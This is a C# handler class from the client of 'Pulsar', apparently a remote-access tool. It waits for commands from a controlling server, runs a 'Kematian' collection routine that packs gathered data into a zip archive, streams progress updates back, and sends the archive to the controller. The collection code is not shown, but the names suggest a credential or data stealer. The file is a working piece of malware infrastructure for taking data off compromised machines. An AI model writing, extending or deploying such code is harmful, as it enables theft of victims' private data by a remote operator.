using Pulsar.Common.Messages;
using Pulsar.Common.Networking;
using Pulsar.Client.Kematian;
using Pulsar.Common.Messages.Monitoring.Kematian;
using Pulsar.Common.Messages.other;
using System.Threading;
using Pulsar.Common.Enums;
using System;
using System.Diagnostics;
namespace Pulsar.Client.Messages
{
    public class KematianHandler : IMessageProcessor
    {
        private static CancellationTokenSource _cancellationTokenSource;
        private static ISender _currentSender;
        private static bool _isRunning = false;
        private static readonly object _lockObject = new object();
        public bool CanExecute(IMessage message) => message is GetKematian || message is SetKematianStatus;
        public bool CanExecuteFrom(ISender sender) => true;
        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKematian msg:
                    Execute(sender, msg);
                    break;
                case SetKematianStatus status:
                    Execute(sender, status);
                    break;
            }
        }

        private void Execute(ISender client, GetKematian message)
        {
            int defaultTimeout = 120; //after 2 minutes all hope is lost :sob:
            byte[] zipFile = Handler.GetData(defaultTimeout);
            client.Send(new GetKematian { ZipFile = zipFile });
        }

        private void Execute(ISender client, SetKematianStatus message)
        {
            _currentSender = client;

            if (message.Status == KematianStatus.Collecting)
            {
                lock (_lockObject)
                {
                    if (_isRunning)
                    {
                        return;
                    }

                    _isRunning = true;
                }


                SendStatus(client, KematianStatus.Idle, 0);


                CancelPrevOperation();
                _cancellationTokenSource = new CancellationTokenSource();

                SendStatus(client, KematianStatus.Collecting, 0);
                new Thread(() => 
                {
                    try
                    {
                        var progressReporter = new Progress<int>(progress => 
                        {
                            SendStatus(client, KematianStatus.Collecting, progress);
                        });

                        try
                        {
                            byte[] data = Handler.GetData(_cancellationTokenSource.Token, progressReporter);


                            if (_cancellationTokenSource.IsCancellationRequested)
                            {
                                Debug.WriteLine("Operation was cancelled, sending Idle status");
                                SendStatus(client, KematianStatus.Idle, 0);
                                return;
                            }

                            if (data != null)
                            {

                                bool statusSent = false;
                                for (int retry = 0; retry < 3 && !statusSent; retry++)
                                {
                                    try
                                    {
                                        SendStatus(client, KematianStatus.Completed, 100);
                                        statusSent = true;
                                    }
                                    catch (Exception ex)
                                    {
                                        Debug.WriteLine($"Failed to send Completed status (attempt {retry+1}): {ex.Message}");
                                        Thread.Sleep(500); 
                                    }
                                }


                                try
                                {
                                    client.Send(new GetKematian { ZipFile = data });


                                    if (!statusSent)
                                    {
                                        SendStatus(client, KematianStatus.Completed, 100);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Debug.WriteLine($"Failed to send GetKematian data: {ex.Message}");



                                    if (statusSent)
                                    {
                                        SendStatus(client, KematianStatus.Failed, 0);
                                    }
                                }
                            }
                            else
                            {
                                SendStatus(client, KematianStatus.Failed, 0);
                            }
                        }
                        catch (OperationCanceledException)
                        {
                            Debug.WriteLine("OperationCanceledException caught, sending Idle status");
                            SendStatus(client, KematianStatus.Idle, 0);
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Exception in Kematian operation: {ex.Message}");
                        try
                        {
                            SendStatus(client, KematianStatus.Failed, 0);
                        }
                        catch { }
                    }
                    finally
                    {
                        lock (_lockObject)
                        {
                            _isRunning = false;
                        }
                    }
                }).Start();
            }
            else if (message.Status == KematianStatus.Idle)
            {


                Debug.WriteLine("Server requested cancellation, sending Idle status immediately");
                SendStatus(client, KematianStatus.Idle, 0);


                CancelPrevOperation();
            }
        }

        private void CancelPrevOperation()
        {
            try
            {
                if (_cancellationTokenSource != null)
                {
                    Debug.WriteLine("Cancelling previous operation");

                    if (!_cancellationTokenSource.IsCancellationRequested)
                    {
                        _cancellationTokenSource.Cancel();
                    }


                    Thread.Sleep(100);

                    if (_currentSender != null)
                    {

                        SendStatus(_currentSender, KematianStatus.Idle, 0);
                    }

                    _cancellationTokenSource.Dispose();
                    _cancellationTokenSource = null;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error during cancel operation: {ex.Message}");


                if (_currentSender != null)
                {
                    try
                    {
                        SendStatus(_currentSender, KematianStatus.Idle, 0);
                    }
                    catch { }
                }
            }
        }

        private void SendStatus(ISender client, KematianStatus status, int percentage)
        {
            try
            {

                if (status == KematianStatus.Collecting && 
                    _cancellationTokenSource != null && 
                    _cancellationTokenSource.IsCancellationRequested)
                {
                    Debug.WriteLine($"Suppressing Collecting status update because operation is cancelled");
                    return;
                }

                Debug.WriteLine($"Sending status {status} with progress {percentage}%");
                client.Send(new SetKematianStatus { 
                    Status = status,
                    Percentage = percentage 
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to send status update: {ex.Message}");
            }
        }
    }
}
